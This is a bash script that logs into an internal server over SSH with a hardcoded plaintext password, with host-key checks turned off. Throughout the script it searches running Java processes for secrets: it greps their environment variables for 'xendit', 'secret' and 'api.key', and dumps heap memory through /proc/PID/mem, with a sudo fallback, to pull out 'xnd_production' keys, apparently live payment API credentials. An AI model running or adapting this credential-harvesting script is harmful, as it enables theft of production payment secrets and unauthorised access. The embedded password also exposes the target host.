#!/bin/bash
export SSHPASS=kutul0nc4t

echo "=== CONNECTING TO NEO (10.13.16.196) ==="
sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 user@10.13.16.196 bash -s << 'REMOTECMD'
echo "=== JAVA PROCESSES ==="
ps aux | grep java | grep -v grep

echo "=== JAVA PIDS ==="
JPIDS=$(pgrep -f java)
echo "PIDs: $JPIDS"

for pid in $JPIDS; do
  echo "--- PID $pid ---"
  echo "Cmdline:"
  cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' '
  echo
  echo "Memory:"
  cat /proc/$pid/status 2>/dev/null | grep -E 'VmRSS|VmSize'
done

echo "=== TOOL CHECK ==="
which jmap 2>/dev/null && echo "JMAP: YES" || echo "JMAP: NO"
which jcmd 2>/dev/null && echo "JCMD: YES" || echo "JCMD: NO"
which strings 2>/dev/null && echo "STRINGS: YES" || echo "STRINGS: NO"
which gcore 2>/dev/null && echo "GCORE: YES" || echo "GCORE: NO"

echo "=== ENV VARS WITH XND ==="
for pid in $JPIDS; do
  echo "--- PID $pid env ---"
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i xnd
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i xendit
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i secret
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i api.key
done

echo "=== /proc MEM STRINGS SEARCH ==="
for pid in $JPIDS; do
  echo "--- Searching /proc/$pid/maps for heap ---"
  # Read heap region and search for xnd_production
  grep heap /proc/$pid/maps 2>/dev/null | head -3
  # Try to read heap and grep for xendit keys
  if [ -r /proc/$pid/mem ]; then
    echo "mem readable"
    # Get heap boundaries
    HEAP=$(grep heap /proc/$pid/maps 2>/dev/null | head -1)
    if [ -n "$HEAP" ]; then
      START=$(echo $HEAP | cut -d'-' -f1)
      END=$(echo $HEAP | cut -d'-' -f2 | cut -d' ' -f1)
      echo "Heap: $START-$END"
      # Use dd to read heap and strings to find xnd keys
      dd if=/proc/$pid/mem bs=1 skip=$((16#$START)) count=$((16#$END - 16#$START)) 2>/dev/null | strings | grep -i "xnd_production" | sort -u | head -50
    fi
  else
    echo "mem not directly readable, trying sudo"
    sudo dd if=/proc/$pid/mem bs=4096 skip=$(($(grep heap /proc/$pid/maps 2>/dev/null | head -1 | cut -d'-' -f1 | xargs -I{} printf '%d' 0x{}) / 4096)) count=100000 2>/dev/null | strings | grep "xnd_production" | sort -u | head -50
  fi
done

echo "=== CHECK /proc/*/cmdline for all processes ==="
for f in /proc/*/cmdline; do
  cat "$f" 2>/dev/null | tr '\0' ' ' | grep -qi xendit && echo "XENDIT in: $f"
done 2>/dev/null

echo "=== DONE ==="
REMOTECMD
